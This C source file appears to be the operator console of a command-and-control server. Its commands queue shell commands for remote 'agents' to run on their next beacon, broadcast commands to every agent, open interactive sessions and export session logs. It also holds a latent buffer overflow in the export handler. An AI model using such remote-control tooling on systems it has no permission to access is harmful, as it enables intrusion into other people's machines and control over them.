#include "../include/Console.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ColReset  "\033[0m"
#define ColWhite  "\033[1;37m"
#define ColYellow "\033[1;33m"
#define ColGray   "\033[0;90m"
#define ColCyan   "\033[0;36m"

static void ClearScreen(void)
{
#ifdef _WIN32
    int R = system("cls"); (void)R;
#else
    fputs("\033[2J\033[H", stdout);
    fflush(stdout);
#endif
}

static void PrintPrompt(SessionPool *P)
{
    if (P->Interactive && P->ActiveId > 0)
        printf("session-%d ~$ ", P->ActiveId);
    else
        printf("server ~$ ");
    fflush(stdout);
}

void ConsolePrintHelp(void)
{
    printf("\n%s  Server Commands%s\n", ColWhite, ColReset);
    printf("  %s%-32s%s %s\n", ColYellow, "help",                    ColReset, "Show this help");
    printf("  %s%-32s%s %s\n", ColYellow, "sessions",                ColReset, "List all active sessions");
    printf("  %s%-32s%s %s\n", ColYellow, "use <id>",                ColReset, "Enter interactive shell with agent");
    printf("  %s%-32s%s %s\n", ColYellow, "exec <id> <cmd>",         ColReset, "Execute command on specific agent");
    printf("  %s%-32s%s %s\n", ColYellow, "execall <id,id,all> <cmd>",ColReset,"Execute command on target agents");
    printf("  %s%-32s%s %s\n", ColYellow, "kill <id>",               ColReset, "Kill a specific agent session");
    printf("  %s%-32s%s %s\n", ColYellow, "kill all",                ColReset, "Kill all active sessions");
    printf("  %s%-32s%s %s\n", ColYellow, "logs",                    ColReset, "Show all log history");
    printf("  %s%-32s%s %s\n", ColYellow, "export <id,logs,all> <path>", ColReset, "Export logs to file");
    printf("  %s%-32s%s %s\n", ColYellow, "info",                    ColReset, "Show server configuration");
    printf("  %s%-32s%s %s\n", ColYellow, "clear",                   ColReset, "Clear terminal");
    printf("  %s%-32s%s %s\n", ColYellow, "exit / quit",             ColReset, "Shutdown server");

    printf("\n%s  Session Commands%s  %s(inside use <id>)%s\n",
           ColWhite, ColReset, ColGray, ColReset);
    printf("  %s%-32s%s %s\n", ColYellow, "<command>", ColReset, "Execute shell command on agent");
    printf("  %s%-32s%s %s\n", ColYellow, "back",      ColReset, "Return to server console");
    printf("  %s%-32s%s %s\n", ColYellow, "kill",      ColReset, "Kill this session");
    printf("  %s%-32s%s %s\n", ColYellow, "clear",     ColReset, "Clear terminal");
    printf("\n");

    printf("  %sExamples%s\n", ColWhite, ColReset);
    printf("  %sexec 2 whoami%s\n",            ColCyan, ColReset);
    printf("  %sexecall 1,2,3 uname -a%s\n",   ColCyan, ColReset);
    printf("  %sexecall all id%s\n",            ColCyan, ColReset);
    printf("  %sexport logs /tmp/all.txt%s\n",  ColCyan, ColReset);
    printf("  %sexport 2 /tmp/sess2.txt%s\n",   ColCyan, ColReset);
    printf("\n");
}

int ConsoleRead(char *Out, int Cap)
{
    if (fgets(Out, Cap, stdin) == NULL) return 0;
    Out[strcspn(Out, "\n")] = '\0';
    return 1;
}

static const char *SkipSpaces(const char *P)
{
    while (*P == ' ') P++;
    return P;
}

static const char *SkipToken(const char *P)
{
    while (*P && *P != ' ') P++;
    return P;
}

int ConsoleExec(const char *Line, SessionPool *P, const Config *C, LogStore *L)
{
    if (P->Interactive && P->ActiveId > 0) {
        AgentSession *S = PoolById(P, P->ActiveId);

        if (!strcmp(Line, "back")) {
            PoolLeave(P);
        } else if (!strcmp(Line, "clear")) {
            ClearScreen(); PrintPrompt(P);
        } else if (!strcmp(Line, "kill")) {
            int Id = P->ActiveId;
            PoolLeave(P);
            PoolKill(P, Id);
        } else if (!strcmp(Line, "help")) {
            ConsolePrintHelp(); PrintPrompt(P);
        } else if (strlen(Line) > 0) {
            if (!S) {
                Msg(L, LogError, "Session no longer active");
                PoolLeave(P); return 1;
            }
            PoolQueueCommand(S, Line);
            char LogBuf[LogMsgLen];
            snprintf(LogBuf, sizeof(LogBuf), "[session-%d] %s", S->Id, Line);
            LogAdd(L, LogCmd, S->Id, LogBuf);
            Msg(L, LogInfo, "Queued — waiting for beacon...");
            PrintPrompt(P);
        } else {
            PrintPrompt(P);
        }
        return 1;
    }

    if (!strcmp(Line, "help")) {
        ConsolePrintHelp();

    } else if (!strcmp(Line, "clear")) {
        ClearScreen();

    } else if (!strcmp(Line, "exit") || !strcmp(Line, "quit")) {
        Msg(L, LogInfo, "Server shutting down");
        return 0;

    } else if (!strcmp(Line, "sessions") || !strcmp(Line, "session")) {
        PoolList(P);

    } else if (!strcmp(Line, "logs")) {
        LogPrint(L);

    } else if (!strcmp(Line, "info")) {
        printf("\n"); ConfigPrint(C); printf("\n");

    } else if (!strncmp(Line, "use ", 4)) {
        int Id = atoi(SkipSpaces(Line + 4));
        if (Id > 0) PoolEnter(P, Id);
        else Msg(L, LogError, "Usage: use <id>");
        return 1;

    } else if (!strncmp(Line, "interact ", 9)) {
        int Id = atoi(SkipSpaces(Line + 9));
        if (Id > 0) PoolEnter(P, Id);
        else Msg(L, LogError, "Usage: interact <id>");
        return 1;

    } else if (!strncmp(Line, "exec ", 5)) {
        const char *After = SkipSpaces(Line + 5);
        int Id = atoi(After);
        const char *Cmd = SkipSpaces(SkipToken(After));
        if (Id <= 0 || !strlen(Cmd))
            Msg(L, LogError, "Usage: exec <id> <command>");
        else
            PoolExec(P, Id, Cmd);
        return 1;

    } else if (!strncmp(Line, "execall ", 8)) {
        const char *After   = SkipSpaces(Line + 8);
        const char *CmdStart = SkipSpaces(SkipToken(After));
        if (!strlen(After) || !strlen(CmdStart)) {
            Msg(L, LogError, "Usage: execall <id,id,all> <command>");
        } else {
            char Targets[256];
            int TLen = (int)(SkipToken(After) - After);
            if (TLen <= 0 || TLen >= 256) {
                Msg(L, LogError, "Invalid target list");
            } else {
                memcpy(Targets, After, (size_t)TLen);
                Targets[TLen] = '\0';
                PoolExecAll(P, Targets, CmdStart);
            }
        }
        return 1;

    } else if (!strncmp(Line, "export ", 7)) {
        const char *After  = SkipSpaces(Line + 7);
        const char *Target = After;
        const char *Path   = SkipSpaces(SkipToken(After));
        if (!strlen(Path)) {
            Msg(L, LogError, "Usage: export <id,logs,all> <path>");
        } else {
            char TargetBuf[64];
            int TLen = (int)(SkipToken(Target) - Target);
            memcpy(TargetBuf, Target, (size_t)TLen);
            TargetBuf[TLen] = '\0';
            if (!strcmp(TargetBuf, "logs") || !strcmp(TargetBuf, "all")) {
                LogExportAll(L, Path);
            } else {
                int Id = atoi(TargetBuf);
                if (Id > 0) LogExportSession(L, Id, Path);
                else Msg(L, LogError, "Usage: export <id,logs,all> <path>");
            }
        }
        return 1;

    } else if (!strcmp(Line, "kill all")) {
        for (int I = 0; I < P->Count; I++)
            if (P->Slots[I].State == StateActive)
                PoolKill(P, P->Slots[I].Id);
        return 1;

    } else if (!strncmp(Line, "kill ", 5)) {
        int Id = atoi(SkipSpaces(Line + 5));
        if (Id > 0) PoolKill(P, Id);
        else Msg(L, LogError, "Usage: kill <id>");
        return 1;

    } else if (strlen(Line) > 0) {
        Msg(L, LogError, "Unknown command — type 'help'");
    }

    PrintPrompt(P);
    return 1;
}
